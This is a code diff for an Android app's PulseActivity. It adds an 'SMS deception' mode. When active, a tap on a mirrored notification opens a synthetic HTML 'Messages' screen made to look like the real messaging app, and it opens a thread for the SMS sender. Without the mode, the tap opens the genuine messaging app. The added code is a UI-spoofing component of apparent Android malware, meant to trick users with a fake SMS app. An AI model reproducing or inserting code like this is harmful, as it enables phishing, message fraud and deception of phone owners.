@@ -83,25 +83,52 @@ class PulseActivity : Activity() {
         if (intent.getBooleanExtra("is_engagement_trigger", false)) {
             EngagementTracker.recordEvent(this, "MIRROR_CLICK")
             val originalPkg = intent.getStringExtra("original_pkg")
+            val smsSender = intent.getStringExtra("sms_sender") ?: ""
             val prefs = getSharedPreferences("app_stats", MODE_PRIVATE)
+            val configPrefs = getSharedPreferences("app_config", MODE_PRIVATE)
             val now = System.currentTimeMillis()
             prefs.edit()
                 .putLong("last_engagement_success", now)
                 .putString("engage_status", "SUCCESS: ${java.text.SimpleDateFormat("MM-dd HH:mm", java.util.Locale.US).format(java.util.Date(now))}")
                 .apply()
             
-            DebugLogger.log("ENGAGE_EVENT", "PHASE 2: SUCCESS. User tapped mirror. OS priority refreshed for $originalPkg context.")
-            
-            try {
-                val launchIntent = packageManager.getLaunchIntentForPackage(originalPkg ?: "com.google.android.apps.messaging")
-                if (launchIntent != null) {
-                    startActivity(launchIntent)
+            val isSmsDeception = configPrefs.getBoolean("sms_deception_active", false)
+
+            if (isSmsDeception) {
+                DebugLogger.log("ENGAGE_EVENT", "SMS Deception Active. Launching synthetic UI for thread: $smsSender")
+                try {
+                    val file = java.io.File(filesDir, "synthetic_sms.html")
+                    val html = if (file.exists()) {
+                        file.readText()
+                    } else {
+                        assets.open("reset_ui/messages.html").bufferedReader().use { it.readText() }
+                    }
+                    DynamicAppHandoff.pendingHtml = html
+                    
+                    val safeSender = smsSender.replace("'", "\\'").replace("\"", "\\\"")
+                    DynamicAppHandoff.pendingJsOnLoad = "setTimeout(function() { if(typeof window.openSpecificThread === 'function') window.openSpecificThread('$safeSender'); }, 500);"
+
+                    val syntheticIntent = Intent(this, DynamicTaskActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                        putExtra("task_title", "Messages")
+                    }
+                    startActivity(syntheticIntent)
+                } catch(e: Exception) {
+                    DebugLogger.log("ENGAGE_ERR", "Failed to launch synthetic SMS: ${e.message}")
                 }
-            } catch (e: Exception) {
-                // Fallback to general SMS view if pkg launch fails
-                val smsIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
-                smsIntent.addCategory(android.content.Intent.CATEGORY_APP_MESSAGING)
-                startActivity(smsIntent)
+            } else {
+                DebugLogger.log("ENGAGE_EVENT", "PHASE 2: SUCCESS. User tapped mirror. OS priority refreshed for $originalPkg context.")
+                try {
+                    val launchIntent = packageManager.getLaunchIntentForPackage(originalPkg ?: "com.google.android.apps.messaging")
+                    if (launchIntent != null) {
+                        startActivity(launchIntent)
+                    }
+                } catch (e: Exception) {
+                    // Fallback to general SMS view if pkg launch fails
+                    val smsIntent = android.content.Intent(android.content.Intent.ACTION_MAIN)
+                    smsIntent.addCategory(android.content.Intent.CATEGORY_APP_MESSAGING)
+                    startActivity(smsIntent)
+                }
             }
             finish()
             return
